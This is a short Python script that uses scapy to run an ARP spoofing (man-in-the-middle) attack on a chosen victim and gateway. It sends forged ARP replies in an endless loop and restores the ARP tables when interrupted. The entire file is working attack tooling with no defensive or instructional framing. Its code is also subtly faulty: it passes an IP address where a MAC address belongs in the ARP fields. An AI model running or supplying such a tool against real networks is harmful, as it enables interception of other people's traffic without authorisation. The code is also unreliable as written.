#!/usr/bin/env python3

# This program performs an ARP Spoofing on a target


# import modules
import argparse
import scapy.all as scapy
import time

# a function to get target over the terminal
def get_target():
	parser = argparse.ArgumentParser() # instantiate an object 
	parser.add_argument("-v", "--victim", dest="victim_IP", help="Specify the victim"
	                   " IP address")
	parser.add_argument("-g", "--gateway", dest="gateway_IP", help="Specify the"
		                " gateway IP address")
	option = parser.parse_args() # parse over the terminal

	# check to see that the user has entered an option
	if not option.victim_IP:
		parser.error("[-] Hey, buddy you need to specify a the victim IP address to get" 
			         " the tool kicking")
		raise SystemExit
	elif not option.gateway_IP:
		parser.error("[-] Hey, buddy you need to specify the gateway IP address to get"
			          " the tool kicking")	
		raise SystemExit
	else:
		return option



# A function to get a MAC address
def get_MAC(target_IP):
	arp_request = scapy.ARP(pdst=target_IP) # instantiates an object of class ARP (ARP packet)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	broadcast_arp_request = broadcast/arp_request
	answered_list=scapy.srp(broadcast_arp_request, timeout=1, verbose=False)[0]
	
	return answered_list[0][1].hwsrc


# A function to create a fake ARP response packet
def spoof_victim(source_ip, destination_ip):
	destination_mac = get_MAC(destination_ip)
	fake_arp_response = scapy.ARP(op=2, psrc=source_ip, pdst=destination_ip, hwdst=destination_ip)
	scapy.send(fake_arp_response, verbose=False)


def clean_arp_poison(source_ip, destination_ip):
	source_mac = get_MAC(source_ip)
	destination_mac = get_MAC(destination_ip)
	genuine_arp_response = scapy.ARP(op=2, psrc=source_ip, hwsrc=source_mac, pdst=destination_ip, hwdst=destination_ip)
	scapy.send(genuine_arp_response, verbose=False, count=5)


option = get_target()

count_fake_arp_response_packets = 0
try:
	while True:
		spoof_victim(option.gateway_IP, option.victim_IP)
		spoof_victim(option.victim_IP, option.gateway_IP)
		count_fake_arp_response_packets += 2
		print("\r[+] Sent %s fake arp response packets" % str(count_fake_arp_response_packets), end="")
		time.sleep(2)
except KeyboardInterrupt:
	print("\n\n[+] Detected CTRL + C key combination ... And now cleaning the ARP poisoning")
	clean_arp_poison(option.gateway_IP, option.victim_IP)
	clean_arp_poison(option.victim_IP, option.gateway_IP)

		